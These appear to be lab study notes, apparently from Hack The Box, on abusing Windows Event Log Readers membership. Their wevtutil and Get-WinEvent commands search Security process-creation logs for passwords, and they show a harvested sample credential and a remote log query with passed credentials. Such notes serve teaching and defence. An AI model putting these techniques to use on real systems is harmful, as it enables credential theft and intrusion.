# Event Log Readers

Monitoring Event ID 4688 (Process Creation) with command-line auditing enables defenders to detect attacker activity, identify suspicious binaries or commands, and even catch credentials passed in commands.

### **Confirming Group Membership**

```powershell
C:\htb> net localgroup "Event Log Readers"

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully.
```

### **Searching Security Logs Using wevtutil**

we search on sensitive data in system logs

```powershell
PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

### **Passing Credentials to wevtutil**

which use to search in far device

```powershell
C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

### **Searching Security Logs Using Get-WinEvent**

```powershell
PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```
